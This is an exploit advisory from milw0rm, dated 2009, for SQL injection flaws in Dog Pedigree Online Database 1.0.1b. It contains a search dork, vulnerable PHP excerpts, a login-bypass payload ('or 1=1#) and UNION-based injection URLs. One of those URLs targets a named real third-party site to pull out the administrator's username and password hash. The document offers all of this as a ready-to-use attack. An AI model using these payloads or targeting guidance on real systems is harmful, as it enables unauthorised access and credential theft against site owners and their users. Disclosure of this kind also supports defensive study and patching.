<html><head><title>Dog Pedigree Online Database 1.0.1b Multiple SQL Injection Vulns</title></head><pre>***********************************************************************************************
***********************************************************************************************
**	       										     **
**  											     **
**     [] [] []  [][][][&gt;  []     []  [][  ][]     []   [][]]  []  [&gt;  [][][][&gt;  [][][][]    **
**     || || ||  []        [][]   []   []  []     []   []      [] []   []	 []    []    **
** [&gt;  [][][][]  [][][][&gt;  [] []  []   []  []   [][]  []       [][]    [][][][&gt;  []    []    **
**  [-----[]-----[][][][&gt;--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][&gt;--[][][][]---\ 
**==[&gt;    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  &gt;&gt;--
**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
   [&gt;   [[[]]]   [][][][&gt;  [][]   [] [][[] [[]]  [][]  [][][]  []  [&gt;  [][][][&gt; &lt;][]   []    **
**							                                     **
**    											     **
**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
**					¡PROUD TO BE SPANISH!				     **
**											     **
***********************************************************************************************
***********************************************************************************************

----------------------------------------------------------------------------------------------
|       	   	     MULTIPLE SQL INJECTION VULNERABILITIES		      	     |
|--------------------------------------------------------------------------------------------|
|                       |    Dog Pedigree Online Database v1.0.1-Beta     |		     |
|  CMS INFORMATION:	 -------------------------------------------------	             |
|										             |
|--&gt;WEB: http://thewhippetarchives.net/twa_is_offline.php          	                     |
|--&gt;DOWNLOAD: http://sourceforge.net/projects/dogarchive          	                     |
|--&gt;DEMO: N/A   	     			    					     |
|--&gt;CATEGORY: Genealogy									     |
|--&gt;DESCRIPTION: This project allows to setup and maintain a database for 	 	     |
|		collecting (dog) pedigrees. The data will actually be collected...	     |
|--&gt;RELEASED: 2009-01-25								     |
|											     |
|  CMS VULNERABILITY:									     |
|											     |
|--&gt;TESTED ON: firefox 3								     |
|--&gt;DORK: inurl:&quot;printable_pedigree.php&quot;				                     |
|--&gt;CATEGORY: AUTH-BYPASS / SQL INJECTION (SQLi)		                             |
|--&gt;AFFECT VERSION: &lt;= 1.0.1 Beta			 			             |
|--&gt;Discovered Bug date: 2009-05-08							     |
|--&gt;Reported Bug date: 2009-05-08							     |
|--&gt;Fixed bug date: 2009-05-12								     |
|--&gt;Info patch (v1.0.2): http://sourceforge.net/projects/dogarchive/	 		     |
|--&gt;Author: YEnH4ckEr									     |
|--&gt;mail: y3nh4ck3r[at]gmail[dot]com							     |
|--&gt;WEB/BLOG: N/A									     |
|--&gt;COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.       |
|--&gt;EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)			     |
----------------------------------------------------------------------------------------------


#####################
////////////////////

AUTH-BYPASS (SQLi):

////////////////////
#####################


&lt;&lt;&lt;&lt;---------++++++++++++++ Condition-1: magic_quotes_gpc=off +++++++++++++++++---------&gt;&gt;&gt;&gt;


-----------
VULN FILE:
-----------


Path --&gt; [HOME_PATH]/php_users/htdocs/processlogin.php
Lines --&gt; 69-73

...

  $sql = sprintf(&quot;
   	SELECT userId,status,email,seclev FROM $USERS_DB.users 
    	WHERE username='%s' AND password='%s'&quot;,
	       $_POST['username'],
	       md5($_POST['password']));
...


-----------
EXPLOIT:
-----------


Username='or 1=1#
Password=nothing



################
////////////////

SQL INJECTION:

////////////////
################


This aplication is completely vulnerable to sql injection. I only show an example.


-----------
VULN FILE:
-----------


Path --&gt; [HOME_PATH]/manageperson.php 
Var --&gt; GET var 'personId'
Lines --&gt; 28,29

...

if (empty($currId))
	$currId = $_GET['personId'];

...


Lines --&gt; 164-165

...

$query = &quot;SELECT * FROM person WHERE id=$currId&quot;;
$result = mysql_query($query) or die('Query failed: ' . mysql_error());
$line = mysql_fetch_object($result);	

...


------
PoC:
------


http://[HOST]/[HOME_PATH]/managePerson.php?personId=-1+UNION+ALL+SELECT+1,version(),user(),database(),version(),user(),database(),version(),user(),database(),11,12%23


Return --&gt; Database version, user and name.


---------
EXPLOIT:
---------


http://www.gavgavclub.ru/tree/managePerson.php?personId=-1+UNION+ALL+SELECT+1,concat(username,0x3A3A3A,password),user(),database(),version(),user(),database(),version(),user(),database(),11,12+FROM+users+WHERE+userId=2252%23


Return --&gt; username:::password


**Note: Admin user id is 2252 by default



&lt;&lt;&lt;-----------------------------EOF----------------------------------&gt;&gt;&gt;ENJOY IT!


#######################################################################
#######################################################################
##*******************************************************************##
##  SPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!  ##
##*******************************************************************##
##-------------------------------------------------------------------##
##*******************************************************************##
## GREETZ TO: JosS, Ulises2k, J.McCray and Spanish Hack3Rs community!##
##*******************************************************************##
#######################################################################
#######################################################################

# milw0rm.com [2009-05-19]</pre></html>